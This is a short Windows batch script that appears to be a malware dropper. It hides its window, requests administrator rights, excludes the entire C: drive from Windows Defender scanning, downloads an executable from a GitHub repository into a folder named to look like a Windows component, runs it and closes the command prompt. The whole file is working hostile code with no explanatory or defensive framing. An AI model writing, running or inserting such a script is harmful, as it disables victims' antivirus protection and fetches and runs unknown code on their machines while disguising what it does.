@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)
set "scriptDir=%~dp0"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
TIMEOUT /T 3
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/aspdasdksa/TROLLLOLL/raw/main/hello.exe', 'C:\WindowsApi\WindowsApi.exe')"
start "" "C:\WindowsApi\WindowsApi.exe"
taskkill /IM cmd.exe
exit
